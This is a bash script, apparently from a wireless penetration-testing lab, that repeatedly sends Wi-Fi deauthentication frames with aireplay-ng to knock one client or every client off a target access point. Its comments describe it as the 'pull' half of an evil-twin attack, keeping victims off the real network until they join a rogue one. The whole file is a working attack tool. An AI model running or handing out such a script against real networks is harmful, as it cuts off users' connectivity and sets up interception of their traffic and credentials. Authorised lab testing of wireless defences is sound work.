#!/usr/bin/env bash
# Continuous deauth in a loop. Used as the "pull" half of the evil-twin
# demo: keep the victim off the real AP long enough that they roam to
# the rogue.
#
# Usage:
#   sudo ./09-deauth-loop.sh -a <bssid> -i <iface> -k <channel> \
#       [-c <client>] [-n <frames>] [-s <sleep-seconds>]
#
# Without -c the deauth is broadcast (kicks ALL clients of that AP).
# Stop with Ctrl-C.

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

require_root

usage() {
    die "Usage: $0 -a <bssid> -i <iface> -k <channel> [-c <client>] [-n <frames>] [-s <sleep>]"
}

BSSID="" CLIENT="" IFACE="" CHANNEL="" COUNT=5 SLEEP=5
while getopts "a:c:i:k:n:s:" opt; do
    case "$opt" in
        a) BSSID=$OPTARG ;;
        c) CLIENT=$OPTARG ;;
        i) IFACE=$OPTARG ;;
        k) CHANNEL=$OPTARG ;;
        n) COUNT=$OPTARG ;;
        s) SLEEP=$OPTARG ;;
        *) usage ;;
    esac
done

[[ -z "$BSSID" || -z "$IFACE" || -z "$CHANNEL" ]] && usage

warn "Continuous deauth loop:"
warn "  AP BSSID  = $BSSID"
warn "  Client    = ${CLIENT:-<broadcast>}"
warn "  Iface/Ch  = $IFACE / $CHANNEL"
warn "  Burst     = $COUNT frames every ${SLEEP}s"
warn "Ctrl-C to stop. Confirm scope in lab-notes/inventory.md."
sleep 3

info "Locking $IFACE to channel $CHANNEL..."
iw dev "$IFACE" set channel "$CHANNEL"

ROUND=0
while true; do
    ROUND=$((ROUND + 1))
    info "Round $ROUND — sending $COUNT frames..."
    if [[ -n "$CLIENT" ]]; then
        aireplay-ng --deauth "$COUNT" -a "$BSSID" -c "$CLIENT" "$IFACE" || true
    else
        aireplay-ng --deauth "$COUNT" -a "$BSSID" "$IFACE" || true
    fi
    sleep "$SLEEP"
done
